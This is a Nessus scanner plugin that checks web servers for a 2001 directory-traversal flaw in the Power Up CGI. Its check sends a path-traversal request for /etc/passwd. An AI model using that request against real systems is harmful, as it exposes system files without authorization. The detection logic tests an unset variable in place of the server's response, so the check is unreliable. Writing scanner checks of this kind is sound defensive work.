#
# Copyright 2001 by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#

if(description)
{
 script_id(10776); 
 script_cve_id("CAN-2001-1138");
 script_bugtraq_id(3304);
 script_version ("$Revision: 1.10 $");

 name["english"] = "Power Up Information Disclosure";
 script_name(english:name["english"]);

 desc["english"] = "
The remote server is using the Power Up CGI. 
This CGI exposes critical system information, and allows remote attackers 
to read any world readable file.

Solution: Disable access to the CGI until the author releases a patch.
Risk factor : High

Additional information:
http://www.securiteam.com/unixfocus/5PP062K5FO.html
";

 script_description(english:desc["english"]);

 summary["english"] = "Power Up Information Disclosure";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2001 SecuriTeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

function check(prefix)
{
 url = string(prefix, "/r.cgi?FILE=../../../../../../../../../../etc/passwd");
 req = http_get(item:url, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if (egrep(pattern:"root:.*:0:[01]:", string:buf))
 {
 security_hole(port:port);
 exit(0);
 }
}


port = get_kb_item("Services/www");
if (!port) port = 80;

if(!get_port_state(port))exit(0);

check(prefix:"/cgi-bin/powerup");
check(prefix:"/cgi_bin/powerup");
foreach dir (cgi_dirs())
{
 check(prefix:dir);
}
